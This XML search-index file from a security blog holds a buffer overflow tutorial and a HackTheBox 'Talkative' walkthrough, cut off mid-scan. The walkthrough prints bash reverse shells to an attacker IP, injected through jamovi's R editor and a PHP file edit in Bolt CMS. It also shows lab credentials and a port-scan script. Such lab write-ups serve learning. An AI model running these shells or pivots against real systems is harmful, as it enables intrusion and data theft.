<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Buffer Overflow: Introduction</title>
      <link href="/posts/binary-exploitation/buffer-overflow-introduction/"/>
      <url>/posts/binary-exploitation/buffer-overflow-introduction/</url>
      
        <content type="html"><![CDATA[<p><img src="https://user-images.githubusercontent.com/9076747/203412163-e8f180a6-5d96-4878-944b-8db1db3f0d25.jpg" alt="buffer overflow banner"></p><p>This week I decided to tackle a subject I’ve had difficulties with in the past. Reverse Engineering and binary exploitation have been a weak point of mine for a while now and I have been looking for an opportunity to get better at them.</p><p>In this article series we are going to study a simple buffer overflow attack and learn how it can lead to code execution via shellcode injection. Later on we will practice with CTF challenges in additional articles.</p><p>That being said, let’s go!</p><h2 id="Buffer"><a href="#Buffer" class="headerlink" title="Buffer"></a>Buffer</h2><p>Let’s start with the beginning: what is a buffer ? </p><p>A buffer is an area of computer memory used to store data, often while moving it from one section of a program to another, or between programs.</p><p>To illustrate we are going to take this very simple code example written in C:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer [<span class="number">500</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buffer, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Let’s break it down:</p><p><code>int main (int argc, char** argv)</code>: main function, taking command lines arguments as parameters.</p><p><code>char buffer [500];</code>: create a 500 bytes buffer to hold data.</p><p><code>strcpy(buffer, argv[1]);</code>: copy the first command line argument into our buffer variable.</p><p><code>return 0;</code>: exit the program with status code 0.</p><p>We can now compile and test the program:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gcc vuln.c -o vuln</span><br><span class="line">[hg8@archbook ~]$ ./vuln hello</span><br><span class="line">[hg8@archbook ~]$</span><br></pre></td></tr></table></figure><p>Aand nothing happens.. but that’s expected. In order to have a simple as possible example, our program doesn’t have any print statement.</p><p>Now we have an easy and working example, before diving into the depth of buffer overflow let’s quickly review what an application memory looks like.</p><h2 id="Memory-Segmentation"><a href="#Memory-Segmentation" class="headerlink" title="Memory Segmentation"></a>Memory Segmentation</h2><p><em>Note: As of today the memory layout of a running application is more complex because of numerous security proactive measures. For learning purposes and this article’s examples, the security, such as Address Space Layout Randomization (<a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a>) have been disabled to not interfere with the demonstration of the buffer overflow issue.</em></p><p>When you run a program, the processor is going to run several calculations depending on your program source code. To make the calculations as fast and efficient as possible it needs to store data in places that can be accessed very quickly. This will be either:</p><ul><li><strong>Processor registry</strong>: On x86 (32 bits) we can note the common <code>EAX</code>, <code>EBX</code>, <code>EIP</code>, <code>ESP</code>, <code>EBP</code>… Those are small memory spaces within the processor used for various purposes.</li><li><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Random Access Memory (RAM)</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>: This is where the majority of information needed by your program is being stored: variables, pointers, stack, heap, etc.</li></ul><p>Let’s take a look at a memory segmentation representation:</p><p><img src="https://user-images.githubusercontent.com/9076747/197627713-085f9767-4c6f-4b72-8859-4826c2cabc3c.svg" alt="memory segmentation representation"></p><p>Explanations:</p><ul><li>The top area at the lowest address is called the <code>text</code> segment and contains the actual program code in machine instructions (<a href="https://en.wikipedia.org/wiki/Assembly_language">asm</a>). This area is read-only, which makes sense because you don’t want another process or a malicious person to change the program code on the run.</li><li>Below we have two <code>data</code> segments, one for the global initialized variables (ex: <code>int global1 = 8;</code>) and another one for global uninitialized variables (ex: <code>int global2;</code>).</li><li>Under the <code>data</code> we have the <code>heap</code> segment. This area is used for large variable initialization (it can be images, files, <code>malloc()</code>, etc.) The growth of <code>heap</code> moves downward higher address depending on its need during program run.</li><li>The <code>stack</code> segment also has variable size and is used to temporarily store local function variables and context during function calls. The stack segment is an <a href="https://en.wikipedia.org/wiki/Stack_(abstract_data_type)">abstract data structure</a> with LIFO ordering. The growth of <code>stack</code> moves upward lower address depending on its need during program run.</li></ul><h2 id="What-is-a-buffer-overflow"><a href="#What-is-a-buffer-overflow" class="headerlink" title="What is a buffer overflow?"></a>What is a buffer overflow?</h2><p>We have now learned what a buffer is and understood the memory segmentation of a program. You may have started to guess what a buffer overflow is and how it can happen. </p><p>A buffer overflow occurs when data written to a buffer corrupts data values in <a href="https://en.wikipedia.org/wiki/Memory_address"></a>memory addresses adjacent to the destination buffer. This can occur when copying data from one buffer to another without first checking that the data fits within the destination buffer.</p><p>Here is a visualization of a buffer overflow. Data is written into buffer A, but is too large to fit within A, so it overflows into buffer B.</p><img src="https://user-images.githubusercontent.com/9076747/203407940-0a7bf715-9296-43a7-9280-a0783d44b576.png" alt="buffer overflow visualization" width="500"/><h2 id="Identifying-buffer-overflow-vulnerability"><a href="#Identifying-buffer-overflow-vulnerability" class="headerlink" title="Identifying buffer overflow vulnerability"></a>Identifying buffer overflow vulnerability</h2><p>If you read our example code, you can notice where our buffer overflow will happen. </p><p>Indeed during the <code>strcopy()</code> of the command line argument into <code>buffer[500]</code>, no length checks are being made. This means no matter the size of our argument, it will be copied into <code>buffer</code> variable. </p><p>So then, how would our program behave if we pass an argument longer than 500 bytes ? Let’s give it a try using python to generate a 501 bytes long string:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ./vuln AAA</span><br><span class="line">[hg8@archbook ~]$ ./vuln $(python -c <span class="string">&#x27;print(&quot;A&quot;*501)&#x27;</span>)</span><br><span class="line">[hg8@archbook ~]$</span><br></pre></td></tr></table></figure><p>Interestingly we get no errors, but if we continue to add more data:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ./vuln $(python -c <span class="string">&#x27;print(&quot;A&quot;*508)&#x27;</span>)</span><br><span class="line">[1]    4753 segmentation fault (core dumped)  ./vuln $(python -c <span class="string">&#x27;print(&quot;A&quot;*508)&#x27;</span>)</span><br></pre></td></tr></table></figure><p>This time we get a segmentation fault at 508 bytes. Why 508 and not 501 ? Because of <a href="https://en.wikipedia.org/wiki/Data_structure_alignment">memory alignment</a>. But we will talk about this later on.</p><p>A segmentation fault occurs when a program attempts to access a memory location that it is not allowed to access, or attempts to access a memory location in a way that is not allowed. This leads, in most cases, to a program crash.</p><blockquote><p>Ok that’s great, it makes the program crash but how can we exploit this ?</p></blockquote><p>The techniques to exploit a buffer overflow varies greatly depending on the architecture, OS and memory region. In this blog series, in order to keep it simple, we are going to focus on stack based buffer overflow on x86 architecture. </p><p>Our exploitation will consist in injecting malicious code (called shellcode) into our buffer and overwriting the return address of the stack segment to point to this injected shellcode.</p><p>Alright, time to get our hands dirty: Buffer Overflow: Command Execution By Shellcode Injection.</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://en.wikipedia.org/wiki/Buffer_overflow">Buffer Overflow - Wikipedia</a></li><li>Niagara Photo by <a href="https://unsplash.com/@claybanks">Clay Banks</a></li></ul><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> Binary Exploitation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> binary exploitation </tag>
            
            <tag> buffer overflow </tag>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Talkative</title>
      <link href="/posts/talkative/"/>
      <url>/posts/talkative/</url>
      
        <content type="html"><![CDATA[<p><img src="https://user-images.githubusercontent.com/9076747/164916795-5c33ab53-424b-4846-9bff-7b4c19ca529d.png" alt="https://user-images.githubusercontent.com/9076747/164916795-5c33ab53-424b-4846-9bff-7b4c19ca529d.png"></p><p>Talkative just retired on Hack The Box, it’s a Hard rated difficulty Linux box. The box solving heavily relied on pivot between application running in docker container, bringing a mix of network and environnement discovery as well as classical exploitation of weakly secured web application. All in all it’s a very good to get more familiar with network and application pivot in containerized environment providing to no usual OS dependency needed for usual recon, pivot and exploitation.<br>I recommend this box to learn more about container exploitation and it’s great opportunity to learn about new pen-testing tools.</p><p><strong>Tl;Dr:</strong> In order to get the user flag the first step was to get a shell on the first container after exploiting a command injection vulnerability in a data visualisation application. With this shell you could retrieve admin credentials for user <code>saul</code> of a Bolt Instance CMS allowing you to pivot to the Bolt container by uploading a PHP shell from the Admin console file editor function. On the container you can write a network discovery script to find a machine with port 22 open, re-using <code>saul</code> password we found earlier on the machine allows us to access the server and grab the user flag.<br>In order to retrieve the root flag you had to connect to the non-secured MongoDB instance running on the server to reset the admin account password of a <code>[Rocket.chat](http://Rocket.chat)</code> application. Once Admin on the application you can exploit a vulnerability to get a shell on its container. This last container have the <code>CAP_DAC_READ_SEARCH</code> capabilities set, allowing the container to read file from host. Exploiting this vulnerability allows us to read the <code>/root/root.txt</code> flag.</p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.129.227.113 talkative.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>And let’s start!</p><h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC talkative.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> talkative.htb (<span class="number">10.129</span><span class="number">.227</span><span class="number">.113</span>)</span><br><span class="line">PORT     STATE    SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp   filtered ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="built_in">open</span>     http    Apache httpd <span class="number">2.4</span><span class="number">.52</span></span><br><span class="line">|_http-generator: Bolt</span><br><span class="line">|_http-title: Talkative.htb | Talkative</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.4</span><span class="number">.52</span> (Debian)</span><br><span class="line"><span class="number">3000</span>/tcp <span class="built_in">open</span>     ppp?</span><br><span class="line">|_    HTTP/<span class="number">1.1</span> <span class="number">400</span> Bad Request</span><br><span class="line"><span class="number">8080</span>/tcp <span class="built_in">open</span>     http    Tornado httpd <span class="number">5.0</span></span><br><span class="line">|_http-title: jamovi</span><br><span class="line">|_http-server-header: TornadoServer/<span class="number">5.0</span></span><br><span class="line"><span class="number">8081</span>/tcp <span class="built_in">open</span>     http    Tornado httpd <span class="number">5.0</span></span><br><span class="line">|_http-title: <span class="number">404</span>: Not Found</span><br><span class="line">|_http-server-header: TornadoServer/<span class="number">5.0</span></span><br><span class="line"><span class="number">8082</span>/tcp <span class="built_in">open</span>     http    Tornado httpd <span class="number">5.0</span></span><br><span class="line">|_http-title: <span class="number">404</span>: Not Found</span><br><span class="line">|_http-server-header: TornadoServer/<span class="number">5.0</span></span><br></pre></td></tr></table></figure><p>Aside from the usual SSH port we have:</p><ul><li>A <code>Bolt CMS</code> landing page running on port <code>8080</code>, looks like a simple landing presenting the project. Some information about the team’s member usernames and app running might be useful to save.</li><li>A <code>jamovi</code> instance running on port <code>8080</code>. Jamovi an open-source software for statistical analysis. We can note that no authentication is required to access all the functionalities.</li><li>An authentication page for <code>Rocket.Chat</code> application on port <code>3000</code>. <code>Rocket.Chat</code> is an open-source group chat application.</li><li>Port <code>8081</code> and <code>8082</code> both returns <code>404</code>.</li></ul><p>The initial footstep took me a while to figure out, after a bunch of fuzzing and trying to find hidden endpoints with no success I decided to focus on the <code>jamovi</code> instance running with no authentication, especially since the homepage explains:</p><blockquote><p>Hi<br>We found a security issue with this version of jamovi, and out of an abundance of caution, we recommend that you update to a newer version when you can.<br>You can continue to use this version of jamovi, but we’d advise you not to open data files from sources you do not trust until you update to a newer version. Sorry for the inconvenience.<br>Update to the latest version today.<br>– the jamovi team</p></blockquote><p>In the “Open” menu we see an interesting entry stored in the root folder: <code>bolt-administration.omv</code>. This is very probably data from the Bolt CMS application running on port <code>80</code> and might contains sensitive information.<br><code>.omv</code> seems to be a jamovi export data file format, which turn to be a simple zip file.<br>Unfortunately we can’t open the file directly in <code>jamovi</code> since the running version is incompatible with the file. Let’s find another way to get it.</p><p>I couldn’t find any useful public CVE or exploit on <code>jamovi</code>, however while researching the documentation of <code>jamovi</code>, I stumble upon this interesting article:</p><blockquote><p><strong>about arbitrary code</strong><br>Some analyses in jamovi can be created using R code with the Rj Editor. This allows for great flexibility in what analyses can be run, however due to the flexibility of R code, it’s possible for someone to write an analysis which does malicious things, such as deleting files. This is a similar situation to other software which allows arbitrary code, such as macros in Microsoft Word or Excel.<br><a href="https://www.jamovi.org/about-arbitrary-code.html">https://www.jamovi.org/about-arbitrary-code.html</a></p></blockquote><p>Well that’s interesting, especially since the <code>Rj Editor</code> is available on our instance. Being not familiar with R language I checked the documentation and learned why <code>jamovi</code> was warning about arbitrary code execution.<br>R Language have a function to Invoke a System command:</p><blockquote><p><strong>Description</strong><br>system invokes the OS command specified by command.<br><strong>Usage</strong><br>system(command, intern = FALSE, ignore.stdout = FALSE, ignore.stderr = FALSE, wait = TRUE, input = NULL, show.output.on.console = TRUE, minimized = FALSE, invisible = TRUE, timeout = 0)<br><a href="https://stat.ethz.ch/R-manual/R-devel/library/base/html/system.html">https://stat.ethz.ch/R-manual/R-devel/library/base/html/system.html</a></p></blockquote><p>Let’s see what happen when we try to run a reverse shell.</p><h3 id="RCE-on-jamovi-Rj-Editor"><a href="#RCE-on-jamovi-Rj-Editor" class="headerlink" title="RCE on jamovi Rj Editor"></a>RCE on jamovi Rj Editor</h3><p>First, as usual, let’s open our <code>nc</code> listener:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p <span class="number">8585</span></span><br><span class="line">Listening on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="number">8585</span></span><br></pre></td></tr></table></figure><p>And input a Bash reverse shell into <code>Rj Editor</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.19/8585 0&gt;&amp;1&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/9076747/164981075-84d9cb80-1d5e-4d2c-ac7a-90255f25393b.png" alt="https://user-images.githubusercontent.com/9076747/164981075-84d9cb80-1d5e-4d2c-ac7a-90255f25393b.png"></p><p>We get a warning about execution of arbitrary code, clicking “Enable” allows the execution of the reverse shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p <span class="number">8585</span></span><br><span class="line">Listening on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="number">8585</span></span><br><span class="line">Connection received on talkative.htb <span class="number">35446</span></span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@b06821bbda78:/<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>We can immediately see that we are running in a Docker container:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@b06821bbda78:/<span class="comment"># cat /proc/1/cgroup</span></span><br><span class="line"><span class="number">12</span>:cpuset:/docker/b06821bbda786b9790c5d7efd202f1d43534dd343f781bcd414aa06a447b7cf6</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><h3 id="Pivot-jamovi-→-Bolt"><a href="#Pivot-jamovi-→-Bolt" class="headerlink" title="Pivot jamovi → Bolt"></a>Pivot jamovi → Bolt</h3><p>Before trying any crazy exploit of container escape let’s see what’s inside this <code>bolt-administration.omv</code> file we found earlier.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@b06821bbda78:/<span class="comment"># l /root</span></span><br><span class="line">Documents/  bolt-administration.omv</span><br><span class="line">root@b06821bbda78:/<span class="comment"># file /root/bolt-administration.omv</span></span><br><span class="line">/root/bolt-administration.omv: Zip archive data, at least v2<span class="number">.0</span> to extract</span><br></pre></td></tr></table></figure><p>We can download the file on our machine using <code>nc</code> it to analyze its content:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -lvp <span class="number">4444</span> &lt; bolt-administration.omv</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@b06821bbda78:/<span class="comment"># nc 10.10.14.19 4444 &gt; /root/bolt-administration.omv</span></span><br><span class="line">bash: nc: command <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure><p>Bummer, <code>nc</code> is not available.</p><p>In that case the easiest way to download the file is to use an <code>netcat</code> wrapper. I will use <code>[pwncat-](https://github.com/calebstewart/pwncat)cs</code>.<br>We need to restart our reverse by using the <code>pwncat</code> listener:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ pwncat-cs -lp <span class="number">8585</span></span><br><span class="line">[<span class="number">14</span>:03:07] Welcome to pwncat 🐈!                                                                                                                                                                    __main__.py:<span class="number">164</span></span><br><span class="line">[<span class="number">14</span>:03:<span class="number">13</span>] received connection <span class="keyword">from</span> <span class="number">10.129</span><span class="number">.227</span><span class="number">.113</span>:<span class="number">37746</span>                                                                                                                                                 bind.py:<span class="number">84</span></span><br><span class="line">[<span class="number">14</span>:03:<span class="number">14</span>] <span class="number">10.129</span><span class="number">.227</span><span class="number">.113</span>:<span class="number">37746</span>: registered new host w/ db                                                                                                                                           manager.py:<span class="number">957</span></span><br><span class="line">(local) pwncat$ <span class="comment"># Ctrl + d to switch to remote host</span></span><br><span class="line">(remote) root@b06821bbda78:/<span class="comment"># ls /root/</span></span><br><span class="line">Documents  bolt-administration.omv</span><br><span class="line">(remote) root@b06821bbda78:/<span class="comment"># # Ctrl + d to switch to local host</span></span><br><span class="line">(local) pwncat$ download /root/bolt-administration.omv .</span><br><span class="line">/root/bolt-administration.omv ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ <span class="number">0.0</span>% • <span class="number">0</span>/<span class="number">0</span> <span class="built_in">bytes</span> • ? • -:--:--</span><br><span class="line">[<span class="number">14</span>:<span class="number">25</span>:<span class="number">40</span>] downloaded <span class="number">2.19</span>KiB <span class="keyword">in</span> <span class="number">0.25</span> seconds</span><br></pre></td></tr></table></figure><p>Let’s now unzip it and take a look at its content:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ unzip bolt-administration.omv</span><br><span class="line">Archive:  bolt-administration.omv</span><br><span class="line">  inflating: META-INF/MANIFEST.MF</span><br><span class="line">  inflating: meta</span><br><span class="line">  inflating: index.html</span><br><span class="line">  inflating: metadata.json</span><br><span class="line">  inflating: xdata.json</span><br><span class="line">  inflating: data.<span class="built_in">bin</span></span><br><span class="line">  inflating: 01 empty/analysis</span><br></pre></td></tr></table></figure><p>The <code>xdata.json</code> file looks promising:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ jq . xdata.json</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;A&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;labels&quot;</span>: [</span><br><span class="line">      [</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;Username&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Username&quot;</span>,</span><br><span class="line">        false</span><br><span class="line">      ],</span><br><span class="line">      [</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;matt@talkative.htb&quot;</span>,</span><br><span class="line">        <span class="string">&quot;matt@talkative.htb&quot;</span>,</span><br><span class="line">        false</span><br><span class="line">      ],</span><br><span class="line">      [</span><br><span class="line">        <span class="number">2</span>,</span><br><span class="line">        <span class="string">&quot;janit@talkative.htb&quot;</span>,</span><br><span class="line">        <span class="string">&quot;janit@talkative.htb&quot;</span>,</span><br><span class="line">        false</span><br><span class="line">      ],</span><br><span class="line">      [</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        <span class="string">&quot;saul@talkative.htb&quot;</span>,</span><br><span class="line">        <span class="string">&quot;saul@talkative.htb&quot;</span>,</span><br><span class="line">        false</span><br><span class="line">      ]</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;B&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;labels&quot;</span>: [</span><br><span class="line">      [</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;Password&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Password&quot;</span>,</span><br><span class="line">        false</span><br><span class="line">      ],</span><br><span class="line">      [</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;jeO09ufhWD&lt;s&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jeO09ufhWD&lt;s&quot;</span>,</span><br><span class="line">        false</span><br><span class="line">      ],</span><br><span class="line">      [</span><br><span class="line">        <span class="number">2</span>,</span><br><span class="line">        <span class="string">&quot;bZ89h&#125;V&lt;S_DA&quot;</span>,</span><br><span class="line">        <span class="string">&quot;bZ89h&#125;V&lt;S_DA&quot;</span>,</span><br><span class="line">        false</span><br><span class="line">      ],</span><br><span class="line">      [</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        <span class="string">&quot;)SQWGm&gt;9KHEA&quot;</span>,</span><br><span class="line">        <span class="string">&quot;)SQWGm&gt;9KHEA&quot;</span>,</span><br><span class="line">        false</span><br><span class="line">      ]</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;C&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;labels&quot;</span>: []</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We got passwords for several accounts. We can try them on the <code>Bolt CMS</code> admin page running on <a href="http://talkative.htb/bolt"><code>http://talkative.htb/bolt</code></a>. None of them seems to works until we try with Bolt CMS default admin username (<code>admin</code>) with the password of <code>saul</code> (<code>jeO09ufhWD&lt;s</code>):</p><p><img src="https://user-images.githubusercontent.com/9076747/164981863-eb9c7f8c-ad33-4c4a-b2d4-bb4c8a01202f.png" alt="https://user-images.githubusercontent.com/9076747/164981863-eb9c7f8c-ad33-4c4a-b2d4-bb4c8a01202f.png"></p><p>Thanks to the file editor accessible on the administration panel, we can easily edit any PHP file to upload reverse shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.19/8585 0&gt;&amp;1&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/9076747/164987197-2a90c327-49d0-4726-9dad-9b04ad36cda6.png" alt="https://user-images.githubusercontent.com/9076747/164987197-2a90c327-49d0-4726-9dad-9b04ad36cda6.png"></p><p>Reloading the page makes our listener to receive a connection:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p <span class="number">8585</span></span><br><span class="line">Listening on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="number">8585</span></span><br><span class="line">Connection received on talkative.htb <span class="number">38904</span></span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@46c004bb2269:/var/www/talkative.htb/bolt/public$</span><br></pre></td></tr></table></figure><h3 id="Pivot-Bolt-→-Saul-user"><a href="#Pivot-Bolt-→-Saul-user" class="headerlink" title="Pivot Bolt → Saul user"></a>Pivot Bolt → Saul user</h3><p>Once again we land on a new Docker container. This time recon doesn’t yield anything interesting at all. The recon part is more difficult than usual because most of common tools are not present on the container (<code>ping</code>, <code>curl</code>, <code>wget</code>, <code>nc</code>, <code>nmap</code>…)</p><p>After being stuck with no results for way too long I decide to create poor man host discovery script to see if any host accessible from our container have their port SSH (22) open:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(seq <span class="number">1</span> <span class="number">20</span>)</span><br><span class="line">do </span><br><span class="line">    host=<span class="number">172.18</span><span class="number">.0</span>.$i</span><br><span class="line">    echo <span class="string">&quot;Scanning $host&quot;</span>;(echo &gt;/dev/tcp/$host/<span class="number">22</span>) &amp;&gt;/dev/null &amp;&amp; echo <span class="string">&quot;$host is up (port 22 open)&quot;</span></span><br><span class="line">done</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@46c004bb2269:/tmp$ bash test.sh</span><br><span class="line">bash test.sh</span><br><span class="line">Scanning <span class="number">172.18</span><span class="number">.0</span><span 